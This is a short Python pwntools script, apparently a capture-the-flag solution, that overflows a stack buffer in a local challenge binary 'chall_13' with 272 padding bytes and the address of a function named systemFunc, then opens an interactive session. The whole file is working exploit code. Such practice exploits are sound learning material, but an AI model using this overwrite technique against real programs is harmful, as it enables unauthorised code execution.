# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_13")
    elf= ELF("./chall_13")
    p=b'a'*272+ p32(elf.sym.systemFunc)
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
